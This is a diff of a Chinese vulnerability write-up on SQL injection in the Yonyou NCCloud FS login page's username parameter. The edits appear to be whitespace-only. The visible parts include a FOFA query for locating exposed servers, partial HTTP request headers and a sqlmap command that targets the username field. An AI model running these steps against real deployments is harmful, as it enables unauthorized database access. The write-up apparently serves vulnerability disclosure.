@@ -16,11 +16,11 @@ source: "MrWQ/vulnerability-paper"
 
 **用友 NCCloud FS 文件管理登录页面对用户名参数没有过滤，存在 SQL 注入**
 
-**二:  漏洞影响🐇**
+**二:  漏洞影响🐇**
 
 **用友 NCCloud**
 
-**三:  漏洞复现🐋**
+**三:  漏洞复现🐋**
 
 ```
 FOFA "NCCloud"
@@ -48,7 +48,7 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
-Cookie: JSESSIONID=2CF7A25EE7F77A064A9DA55456B6994D.server; JSESSIONID=0F83D6A0F3D65B8CD4C26DFEE4FCBC3C.server
+Cookie: JSESSIONID=2CF7A25EE7F77A064A9DA55456B6994D.server; JSESSIONID=0F83D6A0F3D65B8CD4C26DFEE4FCBC3C.server
 Connection: close
 ```
 
@@ -60,7 +60,7 @@ sqlmap -r sql.txt -p username
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5iaY2lic4SJgQRhsPWjR41mmQ11KDar2tiaHBtnNQIbN0pjBcpmPicEW7pbVLwArvRSEiagXKDnUlDW3g/640?wx_fmt=png)
 
- ****四:  关于文库🦉****
+ ****四:  关于文库🦉****
 
 **在线文库：**
 
@@ -97,7 +97,7 @@ sqlmap -r sql.txt -p username
 
 **由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**
 
-**PeiQi 文库 拥有对此文章的修改和解释权如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。**
+**PeiQi 文库 拥有对此文章的修改和解释权如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。**
 
 ---
 
